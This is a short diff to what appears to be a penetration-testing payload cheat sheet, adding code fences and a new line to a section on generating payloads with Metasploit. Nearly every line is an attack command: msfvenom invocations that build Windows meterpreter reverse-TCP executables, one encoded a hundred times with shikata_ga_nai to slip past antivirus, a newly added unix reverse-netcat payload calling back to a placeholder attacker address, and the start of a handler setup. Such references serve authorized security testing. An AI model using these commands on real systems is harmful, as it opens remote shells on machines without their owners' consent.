@@ -31,9 +31,14 @@ https://github.com/xephora/PayloadsAllTheThings
 [Generating Payloads on Windows using Metasploit]
 
 ### [Regular Reverse TCP]
+```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe > shell.exe
 [Poly Morphic Reverse TCP]
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x64/shikata_ga_nai -i 100 -f exe > file.exe
+
+Creating a reverse tcp netcat comamnd
+msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<port> R
+```
 
 ### [Handler]
 msf5 > use exploit/multi/handler
